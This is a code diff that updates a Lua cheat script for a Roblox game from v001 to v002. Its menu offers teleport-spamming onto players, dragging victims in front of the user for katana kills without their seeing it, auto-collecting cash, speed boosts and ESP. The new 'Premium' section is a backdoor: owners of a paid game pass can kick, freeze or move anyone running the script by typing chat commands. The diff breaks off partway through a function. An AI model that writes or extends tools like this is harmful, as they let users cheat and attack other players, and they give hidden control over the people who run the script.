@@ -1,6 +1,3 @@
--- do not skid man
-
---  https://discord.gg/QwqASvEMhY
 local OBIOUS = Instance.new("ScreenGui")
 local Background = Instance.new("Frame")
 local UICorner = Instance.new("UICorner")
@@ -12,10 +9,10 @@ local Home = Instance.new("TextButton")
 local Help = Instance.new("TextButton")
 local Settings = Instance.new("TextButton")
 local Player = Instance.new("TextButton")
-local Random = Instance.new("TextButton")
 local Credits = Instance.new("TextButton")
 local fondo = Instance.new("Frame")
 local UICorner_2 = Instance.new("UICorner")
+local Toggles = Instance.new("TextButton")
 local Home_2 = Instance.new("Frame")
 local PlayerImage = Instance.new("ImageLabel")
 local UICorner_3 = Instance.new("UICorner")
@@ -25,9 +22,11 @@ local UIGradient = Instance.new("UIGradient")
 local TextLabel_3 = Instance.new("TextLabel")
 local Updates2 = Instance.new("Frame")
 local UIListLayout = Instance.new("UIListLayout")
-local v001 = Instance.new("Frame")
+local v002 = Instance.new("Frame")
 local TextLabel_4 = Instance.new("TextLabel")
+local v001 = Instance.new("Frame")
 local TextLabel_5 = Instance.new("TextLabel")
+local TextLabel_6 = Instance.new("TextLabel")
 local Credits_2 = Instance.new("Frame")
 local Title = Instance.new("TextLabel")
 local UI = Instance.new("TextLabel")
@@ -68,18 +67,21 @@ local Spectate = Instance.new("TextButton")
 local Katana = Instance.new("TextButton")
 local SpamTeleport = Instance.new("TextButton")
 local Stop = Instance.new("TextButton")
-local Random_2 = Instance.new("Frame")
+local Toggles_2 = Instance.new("Frame")
 local Title_5 = Instance.new("TextLabel")
 local Frame_2 = Instance.new("Frame")
 local UIGridLayout_2 = Instance.new("UIGridLayout")
-local AutoMask = Instance.new("TextButton")
-local CashAura = Instance.new("TextButton")
 local Speed = Instance.new("TextButton")
+local Speed_2 = Instance.new("TextButton")
+local Speed_3 = Instance.new("TextButton")
+local CashAura = Instance.new("TextButton")
+local AutoMask = Instance.new("TextButton")
+local ESP = Instance.new("TextButton")
 
-if game.PlaceId == 9654491321 then game.Players.LocalPlayer:Kick("oops") end
+--Properties:
 
 OBIOUS.Name = "OBIOUS"
-OBIOUS.Parent = game.CoreGui
+OBIOUS.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
 OBIOUS.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 OBIOUS.ResetOnSpawn = false
 
@@ -91,6 +93,7 @@ Background.Position = UDim2.new(0.499682933, 0, 0.5, 0)
 Background.Size = UDim2.new(0, 449, 0, 375)
 
 UICorner.Parent = Background
+
 Logo.Name = "Logo"
 Logo.Parent = Background
 Logo.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -119,7 +122,7 @@ Version.BackgroundTransparency = 1.000
 Version.Position = UDim2.new(0.534521163, 0, 0.189921737, 0)
 Version.Size = UDim2.new(0, 200, 0, 25)
 Version.Font = Enum.Font.SourceSansSemibold
-Version.Text = "v001"
+Version.Text = "v002"
 Version.TextColor3 = Color3.fromRGB(255, 255, 255)
 Version.TextSize = 15.000
 Version.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
@@ -189,19 +192,6 @@ Player.TextColor3 = Color3.fromRGB(0, 255, 0)
 Player.TextSize = 20.000
 Player.TextWrapped = true
 
-Random.Name = "Random"
-Random.Parent = TopBar
-Random.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Random.BackgroundTransparency = 1.000
-Random.BorderColor3 = Color3.fromRGB(27, 42, 53)
-Random.Position = UDim2.new(0.272605777, 0, 0, 0)
-Random.Size = UDim2.new(0, 153, 0, 35)
-Random.Font = Enum.Font.SourceSansBold
-Random.Text = "RANDOM"
-Random.TextColor3 = Color3.fromRGB(0, 255, 0)
-Random.TextSize = 20.000
-Random.TextWrapped = true
-
 Credits.Name = "Credits"
 Credits.Parent = TopBar
 Credits.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
@@ -222,6 +212,19 @@ fondo.Position = UDim2.new(0, 0, 0.547169805, 0)
 fondo.Size = UDim2.new(0, 153, 0, 6)
 
 UICorner_2.Parent = fondo
+
+Toggles.Name = "Toggles"
+Toggles.Parent = TopBar
+Toggles.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Toggles.BackgroundTransparency = 1.000
+Toggles.BorderColor3 = Color3.fromRGB(27, 42, 53)
+Toggles.Position = UDim2.new(0.272605777, 0, 0, 0)
+Toggles.Size = UDim2.new(0, 153, 0, 35)
+Toggles.Font = Enum.Font.SourceSansBold
+Toggles.Text = "TOGGLES"
+Toggles.TextColor3 = Color3.fromRGB(0, 255, 0)
+Toggles.TextSize = 20.000
+Toggles.TextWrapped = true
 
 Home_2.Name = "Home"
 Home_2.Parent = Background
@@ -283,34 +286,51 @@ Updates2.Size = UDim2.new(0, 449, 0, 122)
 UIListLayout.Parent = Updates2
 UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder
 
+v002.Name = "v002"
+v002.Parent = Updates2
+v002.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+v002.BackgroundTransparency = 1.000
+v002.Size = UDim2.new(0, 449, 0, 24)
+
+TextLabel_4.Parent = v002
+TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.BackgroundTransparency = 1.000
+TextLabel_4.Position = UDim2.new(0.048997771, 0, 0, 0)
+TextLabel_4.Size = UDim2.new(0, 427, 0, 24)
+TextLabel_4.Font = Enum.Font.SourceSansSemibold
+TextLabel_4.Text = "v002 - Added ESP in the toggles section, added Premium."
+TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_4.TextSize = 16.000
+TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
+
 v001.Name = "v001"
 v001.Parent = Updates2
 v001.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 v001.BackgroundTransparency = 1.000
 v001.Size = UDim2.new(0, 449, 0, 24)
 
-TextLabel_4.Parent = v001
-TextLabel_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.BackgroundTransparency = 1.000
-TextLabel_4.Position = UDim2.new(0.048997771, 0, 0, 0)
-TextLabel_4.Size = UDim2.new(0, 427, 0, 24)
-TextLabel_4.Font = Enum.Font.SourceSansSemibold
-TextLabel_4.Text = "v001 - First version"
-TextLabel_4.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_4.TextSize = 16.000
-TextLabel_4.TextXAlignment = Enum.TextXAlignment.Left
-
-TextLabel_5.Parent = Home_2
+TextLabel_5.Parent = v001
 TextLabel_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel_5.BackgroundTransparency = 1.000
-TextLabel_5.Position = UDim2.new(0.538975477, 0, 0.910714328, 0)
-TextLabel_5.Size = UDim2.new(0, 200, 0, 25)
+TextLabel_5.Position = UDim2.new(0.048997771, 0, 0, 0)
+TextLabel_5.Size = UDim2.new(0, 427, 0, 24)
 TextLabel_5.Font = Enum.Font.SourceSansSemibold
-TextLabel_5.Text = "by jaorbw#5640 and scope#9999"
+TextLabel_5.Text = "v001 - First version"
 TextLabel_5.TextColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.TextSize = 20.000
-TextLabel_5.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
-TextLabel_5.TextXAlignment = Enum.TextXAlignment.Right
+TextLabel_5.TextSize = 16.000
+TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
+
+TextLabel_6.Parent = Home_2
+TextLabel_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.BackgroundTransparency = 1.000
+TextLabel_6.Position = UDim2.new(0.538975477, 0, 0.910714328, 0)
+TextLabel_6.Size = UDim2.new(0, 200, 0, 25)
+TextLabel_6.Font = Enum.Font.SourceSansSemibold
+TextLabel_6.Text = "by jaorbw#5640 and scope#9999"
+TextLabel_6.TextColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.TextSize = 20.000
+TextLabel_6.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
+TextLabel_6.TextXAlignment = Enum.TextXAlignment.Right
 
 Credits_2.Name = "Credits"
 Credits_2.Parent = Background
@@ -697,27 +717,27 @@ Stop.Text = "Stop"
 Stop.TextColor3 = Color3.fromRGB(255, 255, 255)
 Stop.TextSize = 14.000
 
-Random_2.Name = "Random"
-Random_2.Parent = Background
-Random_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
-Random_2.BackgroundTransparency = 1.000
-Random_2.Position = UDim2.new(0, 0, 0.136000007, 0)
-Random_2.Size = UDim2.new(0, 449, 0, 280)
-Random_2.Visible = false
+Toggles_2.Name = "Toggles"
+Toggles_2.Parent = Background
+Toggles_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+Toggles_2.BackgroundTransparency = 1.000
+Toggles_2.Position = UDim2.new(0, 0, 0.136000007, 0)
+Toggles_2.Size = UDim2.new(0, 449, 0, 280)
+Toggles_2.Visible = false
 
 Title_5.Name = "Title"
-Title_5.Parent = Random_2
+Title_5.Parent = Toggles_2
 Title_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Title_5.BackgroundTransparency = 1.000
 Title_5.Position = UDim2.new(0.287305176, 0, -0.0249998979, 0)
 Title_5.Size = UDim2.new(0, 200, 0, 25)
 Title_5.Font = Enum.Font.SourceSansBold
-Title_5.Text = "RANDOM"
+Title_5.Text = "TOGGLES"
 Title_5.TextColor3 = Color3.fromRGB(255, 255, 255)
 Title_5.TextSize = 30.000
 Title_5.TextStrokeColor3 = Color3.fromRGB(255, 255, 255)
 
-Frame_2.Parent = Random_2
+Frame_2.Parent = Toggles_2
 Frame_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
 Frame_2.BackgroundTransparency = 1.000
 Frame_2.Position = UDim2.new(0.0222717151, 0, 0.110299028, 0)
@@ -727,15 +747,35 @@ UIGridLayout_2.Parent = Frame_2
 UIGridLayout_2.SortOrder = Enum.SortOrder.LayoutOrder
 UIGridLayout_2.CellSize = UDim2.new(0, 140, 0, 27)
 
-AutoMask.Name = "AutoMask"
-AutoMask.Parent = Frame_2
-AutoMask.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-AutoMask.BorderSizePixel = 0
-AutoMask.Size = UDim2.new(0, 200, 0, 50)
-AutoMask.Font = Enum.Font.SourceSans
-AutoMask.Text = "Auto Mask"
-AutoMask.TextColor3 = Color3.fromRGB(255, 255, 255)
-AutoMask.TextSize = 14.000
+Speed.Name = "Speed-"
+Speed.Parent = Frame_2
+Speed.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Speed.BorderSizePixel = 0
+Speed.Size = UDim2.new(0, 200, 0, 50)
+Speed.Font = Enum.Font.SourceSans
+Speed.Text = "-50 speed"
+Speed.TextColor3 = Color3.fromRGB(255, 255, 255)
+Speed.TextSize = 14.000
+
+Speed_2.Name = "Speed"
+Speed_2.Parent = Frame_2
+Speed_2.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Speed_2.BorderSizePixel = 0
+Speed_2.Size = UDim2.new(0, 200, 0, 50)
+Speed_2.Font = Enum.Font.SourceSans
+Speed_2.Text = "Speed (C)"
+Speed_2.TextColor3 = Color3.fromRGB(255, 255, 255)
+Speed_2.TextSize = 14.000
+
+Speed_3.Name = "Speed+"
+Speed_3.Parent = Frame_2
+Speed_3.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+Speed_3.BorderSizePixel = 0
+Speed_3.Size = UDim2.new(0, 200, 0, 50)
+Speed_3.Font = Enum.Font.SourceSans
+Speed_3.Text = "+50 speed"
+Speed_3.TextColor3 = Color3.fromRGB(255, 255, 255)
+Speed_3.TextSize = 14.000
 
 CashAura.Name = "CashAura"
 CashAura.Parent = Frame_2
@@ -747,22 +787,34 @@ CashAura.Text = "Cash Aura"
 CashAura.TextColor3 = Color3.fromRGB(255, 255, 255)
 CashAura.TextSize = 14.000
 
-Speed.Name = "Speed"
-Speed.Parent = Frame_2
-Speed.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-Speed.BorderSizePixel = 0
-Speed.Size = UDim2.new(0, 200, 0, 50)
-Speed.Font = Enum.Font.SourceSans
-Speed.Text = "Speed (C)"
-Speed.TextColor3 = Color3.fromRGB(255, 255, 255)
-Speed.TextSize = 14.000
+AutoMask.Name = "AutoMask"
+AutoMask.Parent = Frame_2
+AutoMask.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+AutoMask.BorderSizePixel = 0
+AutoMask.Size = UDim2.new(0, 200, 0, 50)
+AutoMask.Font = Enum.Font.SourceSans
+AutoMask.Text = "Auto Mask"
+AutoMask.TextColor3 = Color3.fromRGB(255, 255, 255)
+AutoMask.TextSize = 14.000
 
+ESP.Name = "ESP"
+ESP.Parent = Frame_2
+ESP.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+ESP.BorderSizePixel = 0
+ESP.Size = UDim2.new(0, 200, 0, 50)
+ESP.Font = Enum.Font.SourceSans
+ESP.Text = "ESP"
+ESP.TextColor3 = Color3.fromRGB(255, 255, 255)
+ESP.TextSize = 14.000
+
+--VALUES
 local automask = Instance.new("BoolValue",S1)
 local cashaura = Instance.new("BoolValue",S1)
 local prefix = Instance.new("StringValue", Background)
+local cmdsenabled = Instance.new("BoolValue",S1)
+
 prefix.Name = "Prefix"
 prefix.Value = "!"
-local cmdsenabled = Instance.new("BoolValue",S1)
 
 local fly = Instance.new("BoolValue",S1)
 
@@ -773,338 +825,155 @@ cashaura.Name = "CashAura"
 cmdsenabled.Name = "CommandsEnabled"
 fly.Name = "Fly"
 speed.Name = "Speed"
-
--- Scripts:
-
-local function MZDU_fake_script() -- PlayerImage.LocalScript 
-	local script = Instance.new('LocalScript', PlayerImage)
-
-	wait(1)
-	script.Parent.Image = game.Players:GetUserThumbnailAsync(game.Players.LocalPlayer.UserId,Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-end
-coroutine.wrap(MZDU_fake_script)()
-local function TEGF_fake_script() -- TextLabel_2.LocalScript 
-	local script = Instance.new('LocalScript', TextLabel_2)
-
-	wait(1)
-	script.Parent.Text = "Welcome back, "..game.Players.LocalPlayer.Name
-end
-coroutine.wrap(TEGF_fake_script)()
-local function KILFZLD_fake_script() -- Background.Framework 
-	local script = Instance.new('LocalScript', Background)
-
-	local TweenService = game:GetService("TweenService")
-	local info = TweenInfo.new(
-		.2,
-		Enum.EasingStyle.Sine,
-		Enum.EasingDirection.Out,
-		0,
-		false,
-		0
-	)
-	local TopBar = script.Parent.TopBar
-	wait(1)
-	print("SUCCESSFULLY LOADED OBIOUS (THE BEST UNITED HOOD SCRIPT) BY jaorbw#5640 AND scope#9999")
-	for i,button in pairs(TopBar:GetChildren()) do
-		if button:IsA("TextButton") then
-			button.MouseButton1Click:Connect(function()
-				local change = {Position = UDim2.new(button.Position.X.Scale,button.Position.X.Offset, 0.547,0)}
-				local ChangePos = TweenService:Create(TopBar.fondo,info,change)
-				ChangePos:Play()
-				for i, frame in pairs(script.Parent:GetChildren()) do
-					if frame:IsA("Frame") then
-						if frame.Name ~= "Logo" then 
-							frame.Visible = false		
-						end
-						script.Parent:FindFirstChild(button.Name).Visible = true
-					end
-				end
-			end)
-		end
-	end
-end
-coroutine.wrap(KILFZLD_fake_script)()
-local function FLEZ_fake_script() -- cmds_2.LocalScript 
-	local script = Instance.new('LocalScript', cmds_2)
-
-	while wait() do
-		script.Parent.Text = script.Parent.Parent.Parent.Parent.Prefix.Value.."stop - Stops everything." 
-	end
-end
-coroutine.wrap(FLEZ_fake_script)()
-local function IHZOV_fake_script() -- cmds_3.LocalScript 
-	local script = Instance.new('LocalScript', cmds_3)
-
-	while wait() do
-		script.Parent.Text = script.Parent.Parent.Parent.Parent.Prefix.Value.."start [Player] - Spam teleports you to the selected player." 
-	end
-end
-coroutine.wrap(IHZOV_fake_script)()
-local function TBET_fake_script() -- cmds_4.LocalScript 
-	local script = Instance.new('LocalScript', cmds_4)
-
-	while wait() do
-		script.Parent.Text = script.Parent.Parent.Parent.Parent.Prefix.Value.."katana [Player] - Spam brings the selected player to you so you can spam katana on them. (Does not work with guns) (They cant see that you are bringing them)" 
-	end
-end
-coroutine.wrap(TBET_fake_script)()
-local function DLDVSHD_fake_script() -- cmds_5.LocalScript 
-	local script = Instance.new('LocalScript', cmds_5)
-
-	while wait() do
-		script.Parent.Text = script.Parent.Parent.Parent.Parent.Prefix.Value.."to [Player] - Teleports you to a player." 
-	end
-end
-coroutine.wrap(DLDVSHD_fake_script)()
-local function RXTC_fake_script() -- cmds_6.LocalScript 
-	local script = Instance.new('LocalScript', cmds_6)
-
-	while wait() do
-		script.Parent.Text = script.Parent.Parent.Parent.Parent.Prefix.Value.."prefix [String] - Change the prefix for the commands." 
-	end
-end
-coroutine.wrap(RXTC_fake_script)()
-local function FTWL_fake_script() -- Background.SettingsHandler 
-	local script = Instance.new('LocalScript', Background)
-
-	local sett = script.Parent.S1
-	
-	
-	game.Players.LocalPlayer.CharacterAdded:Connect(function()
-		if sett.Fly.Value == true then
-			
-		end
-		if sett.AutoMask.Value == true then
-			
-		end
-	end)
-	
-	game:GetService("UserInputService").InputEnded:Connect(function(inp)
-		if inp.KeyCode == Enum.KeyCode.C then
-			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 16
-		end
-	end)
-	
-	
-	game:GetService("UserInputService").InputBegan:Connect(function(inp)
-		if sett.Speed.Value == false then return end
-		if inp.KeyCode == Enum.KeyCode.C then
-			game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 100
-		end
-	end)
-	
-end
-coroutine.wrap(FTWL_fake_script)()
-local function ZQTVZHH_fake_script()
-	local script = Instance.new('LocalScript', Background)
-
-	while wait(.1) do
-		if script.Parent.S1.CashAura.Value == true then
-			for i,v in pairs(workspace:GetChildren()) do
-				if v.Name == "Money" then
-					fireclickdetector(v.ClickDetector)
-				end
-			end	
-		end
-	end
-end
-coroutine.wrap(ZQTVZHH_fake_script)()
-local function DMGY_fake_script() -- Background.Drag 
-	local script = Instance.new('LocalScript', Background)
-
-	local UIS = game:GetService('UserInputService')
-	local frame = script.Parent
-	local dragToggle = nil
-	local dragSpeed = .15
-	local dragStart = nil
-	local startPos = nil
-	
-	local function updateInput(input)
-		local delta = input.Position - dragStart
-		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
-			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
-		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
-	end
-	
-	frame.InputBegan:Connect(function(input)
-		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
-			dragToggle = true
-			dragStart = input.Position
-			startPos = frame.Position
-			input.Changed:Connect(function()
-				if input.UserInputState == Enum.UserInputState.End then
-					dragToggle = false
-				end
-			end)
-		end
-	end)
-	
-	UIS.InputChanged:Connect(function(input)
-		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
-			if dragToggle then
-				updateInput(input)
-			end
-		end
-	end)
-end
-coroutine.wrap(DMGY_fake_script)()
-local function RCFQSGR_fake_script() -- TextButton.LocalScript 
-	local script = Instance.new('LocalScript', TextButton)
-
-	local TweenService = game:GetService("TweenService")
-	local info = TweenInfo.new(
-		.2,
-		Enum.EasingStyle.Sine,
-		Enum.EasingDirection.Out,
-		0,
-		false,
-		0
-	)
-	local sett = script.Parent.Parent.Parent.Parent.S1
-	local selected = false
-	script.Parent.MouseButton1Click:Connect(function()
-		local Yes = {Position = UDim2.new(-0.017, 0,0, 0)}
-		local No = {Position = UDim2.new(0.456, 0,0, 0),}
-		local Yes2 = {BackgroundColor3 = Color3.fromRGB(48, 218, 18)}
-		local No2 = {BackgroundColor3 = Color3.fromRGB(132, 132, 132)}
-		selected = not selected
-		if selected == true then
-			TweenService:Create(script.Parent, info, Yes):Play()
-			TweenService:Create(script.Parent.Parent, info, Yes2):Play()
-			sett.CommandsEnabled.Value = true
-		else
-			TweenService:Create(script.Parent, info, No):Play()
-			TweenService:Create(script.Parent.Parent, info, No2):Play()
-			sett.CommandsEnabled.Value = false
-		end
-	end)
-end
-coroutine.wrap(RCFQSGR_fake_script)()
-local function GZTM_fake_script() -- Pname.FindPlayer 
-	local script = Instance.new('LocalScript', Pname)	
-	game:GetService("UserInputService").TextBoxFocusReleased:Connect(function(text)
-		local function GetPlayer(input) 
-			for _, plr in pairs(game.Players:GetPlayers()) do
-				if (string.lower(input) == string.sub(string.lower(plr.Name), 1, #input)) then
-					return plr;
-				end
-			end
-		end
-		if text == script.Parent then
-			local text_1 = script.Parent.Text
-			local plr = GetPlayer(text_1)
-			if plr then
-				local PINFO = script.Parent.Parent.Pinfo
-				PINFO.User.Text = plr.Name
-				PINFO.Display.Text = plr.DisplayName
-				PINFO.ImageLabel.Image = game.Players:GetUserThumbnailAsync(plr.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
-				wait()
-				PINFO.Visible = true
-			else
-				script.Parent.Parent.Pinfo.Visible = false
-			end
-		end
-	end)
-end
-coroutine.wrap(GZTM_fake_script)()
-local function UYSNW_fake_script() -- Pinfo.Handler 
-	local script = Instance.new('LocalScript', Pinfo)
-
-	local frame = script.Parent.Frame
-	_G.Attacking = false
-	local spectating = false
-	frame.Spectate.MouseButton1Click:Connect(function()
-		spectating = not spectating
-		if spectating == true then
-			workspace.CurrentCamera.CameraSubject = workspace:FindFirstChild(script.Parent.User.Text).Humanoid
-		else
-			workspace.CurrentCamera.CameraSubject = game.Players.LocalPlayer.Character.Humanoid
-		end
-	end)
-	
-	frame.Stop.MouseButton1Click:Connect(function()
-		_G.Attacking = false
-	end)
-	
-	frame.Teleport.MouseButton1Click:Connect(function()
-		game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = workspace:FindFirstChild(script.Parent.User.Text).HumanoidRootPart.CFrame
-	end)
-	
-	frame.SpamTeleport.MouseButton1Click:Connect(function()
-		_G.Attacking = true
-		local char = workspace:FindFirstChild(script.Parent.User.Text)
-		repeat wait(.1)
-			game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = char.HumanoidRootPart.CFrame
-		until _G.Attacking == false or char.Humanoid.Health < .5
-	end)
-	
-	frame.Katana.MouseButton1Click:Connect(function()
-		_G.Attacking = true
-		local char = workspace:FindFirstChild(script.Parent.User.Text)
-		repeat wait()
-			char.HumanoidRootPart.CFrame = 	game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame * CFrame.new(0,-.5,-2.5)
-		until _G.Attacking == false or char.Humanoid.Health < .5
-	end)
-end
-coroutine.wrap(UYSNW_fake_script)()
-local function WPWCM_fake_script() -- AutoMask.LocalScript 
-	local script = Instance.new('LocalScript', AutoMask)
-
-	local clicked = false
-	local sett = script.Parent.Parent.Parent.Parent.S1
-	script.Parent.MouseButton1Click:Connect(function()
-		clicked = not clicked
-		if clicked == true then
-			script.Parent.BackgroundColor3 = Color3.fromRGB(51, 111, 11)
-			sett.AutoMask.Value = true
-		else
-			script.Parent.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-			sett.AutoMask.Value = false
-		end
-	end)
-end
-coroutine.wrap(WPWCM_fake_script)()
-local function EXCES_fake_script() -- CashAura.LocalScript 
-	local script = Instance.new('LocalScript', CashAura)
-
-	local clicked = false
-	local sett = script.Parent.Parent.Parent.Parent.S1
-	script.Parent.MouseButton1Click:Connect(function()
-		clicked = not clicked
-		if clicked == true then
-			script.Parent.BackgroundColor3 = Color3.fromRGB(51, 111, 11)
-			sett.CashAura.Value = true
-		else
-			script.Parent.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-			sett.CashAura.Value = false
-		end
-	end)
-end
-coroutine.wrap(EXCES_fake_script)()
-local function HVVXZMT_fake_script() -- Speed.LocalScript 
-	local script = Instance.new('LocalScript', Speed)
-
-	local clicked = false
-	local sett = script.Parent.Parent.Parent.Parent.S1
-	script.Parent.MouseButton1Click:Connect(function()
-		clicked = not clicked
-		if clicked == true then
-			script.Parent.BackgroundColor3 = Color3.fromRGB(51, 111, 11)
-			sett.Speed.Value = true
-		else
-			script.Parent.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
-			sett.Speed.Value = false
-		end
-	end)
-end
-coroutine.wrap(HVVXZMT_fake_script)()
+--GLOBALS
 
 _G.Attacking = false
-game.Players.LocalPlayer.Chatted:Connect(function(m1)
-	if cmdsenabled.Value == false then return end
-	if not  workspace:FindFirstChild(game.Players.LocalPlayer.Name) then return end
-	if not  workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("HumanoidRootPart") then return end
-	local HRP = game.Players.LocalPlayer.Character.HumanoidRootPart
+_G.Speed = false
+
+--DRAG
+local UIS = game:GetService('UserInputService')
+local dragToggle = nil
+local dragSpeed = .15
+local dragStart = nil
+local startPos = nil
+
+local function updateInput(input)
+	local delta = input.Position - dragStart
+	local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
+		startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	game:GetService('TweenService'):Create(Background, TweenInfo.new(dragSpeed), {Position = position}):Play()
+end
+
+Background.InputBegan:Connect(function(input)
+	if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
+		dragToggle = true
+		dragStart = input.Position
+		startPos = Background.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragToggle = false
+			end
+		end)
+	end
+end)
+
+UIS.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+		if dragToggle then
+			updateInput(input)
+		end
+	end
+end)
+--others
+wait()
+PlayerImage.Image = game.Players:GetUserThumbnailAsync(game.Players.LocalPlayer.UserId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
+TextLabel_2.Text = game.Players.LocalPlayer.Name
+local TweenService = game:GetService("TweenService")
+local info = TweenInfo.new(
+	.2,
+	Enum.EasingStyle.Sine,
+	Enum.EasingDirection.Out,
+	0,
+	false,
+	0
+)
+local tutinfo = TweenInfo.new(
+	.5,
+	Enum.EasingStyle.Sine,
+	Enum.EasingDirection.Out,
+	999999999999999999,
+	true,
+	.5
+)
+local tutorialtw = TweenService:Create(TopBar,tutinfo,{CanvasPosition = Vector2.new(100, 0)})
+tutorialtw:Play()
+for i,v in pairs(TopBar:GetChildren()) do
+	v.MouseWheelForward:Connect(function()
+		tutorialtw:Pause()
+	end)
+	v.MouseWheelBackward:Connect(function()
+		tutorialtw:Pause()
+	end)
+end
+TopBar.MouseWheelForward:Connect(function()
+	tutorialtw:Pause()
+end)
+TopBar.MouseWheelBackward:Connect(function()
+	tutorialtw:Pause()
+end)
+print("SUCCESSFULLY LOADED OBIOUS BY jaorbw#5640 AND scope#9999")
+local function GetPlayer(input) 
+	for _, plr in pairs(game.Players:GetPlayers()) do
+		if (string.lower(input) == string.sub(string.lower(plr.Name), 1, #input)) then
+			return plr;
+		elseif (string.lower(input) == string.sub(string.lower(plr.DisplayName), 1, #input)) then
+			return plr;
+		end
+	end
+end
+for i,button in pairs(TopBar:GetChildren()) do
+	if button:IsA("TextButton") then
+		button.MouseButton1Click:Connect(function()
+			local change = {Position = UDim2.new(button.Position.X.Scale,button.Position.X.Offset, 0.547,0)}
+			local ChangePos = TweenService:Create(TopBar.fondo,info,change)
+			ChangePos:Play()
+			for i, frame in pairs(Background:GetChildren()) do
+				if frame:IsA("Frame") then
+					if frame.Name ~= "Logo" then 
+						frame.Visible = false
+					end
+					Background:FindFirstChild(button.Name).Visible = true
+					if Background:FindFirstChild("Tutorial") then
+						Background:FindFirstChild("Tutorial"):Destroy()
+					end
+				end
+			end
+		end)
+	end
+end
+--PREMIUM
+for i,p in pairs(game.Players:GetPlayers()) do
+	if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(p.UserId, 79711431, true) then
+		if game:GetService("MarketplaceService"):UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 79711431, true) then return end
+		p.Chatted:Connect(function(msg)
+			local text = string.split(msg," ")
+			local PTK = GetPlayer(text[2])
+			if text[1] == ":kick" then
+				if text[2] == "." then
+					game.Players.LocalPlayer:Kick("A premium member kicked you. Premium Member username: "..p.Name)
+				elseif PTK == game.Players.LocalPlayer then
+					game.Players.LocalPlayer:Kick("A premium member kicked you. Premium Member username: "..p.Name)
+				end
+			elseif text[1] == ":ban" then
+				if text[2] == "." then
+					game.Players.LocalPlayer:Kick("User BANNED")
+				elseif PTK == game.Players.LocalPlayer then
+					game.Players.LocalPlayer:Kick("User BANNED")
+				end
+			elseif text[1] == ":bring" then
+				if text[2] == "." then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRoorPart.CFrame
+				elseif PTK == game.Players.LocalPlayer then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = p.Character.HumanoidRoorPart.CFrame
+				end
+			elseif text[1] == ":freeze" then
+				if text[2] == "." then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				elseif PTK == game.Players.LocalPlayer then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = true
+				end
+			elseif text[1] == ":unfreeze" then
+				if text[2] == "." then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+				elseif PTK == game.Players.LocalPlayer then
+					game.Players.LocalPlayer.Character.HumanoidRootPart.Anchored = false
+				end
+			end
+		end)
+	end
+end
+--findplayer
+game:GetService("UserInputService").TextBoxFocusReleased:Connect(function(text)
 	local function GetPlayer(input) 
 		for _, plr in pairs(game.Players:GetPlayers()) do
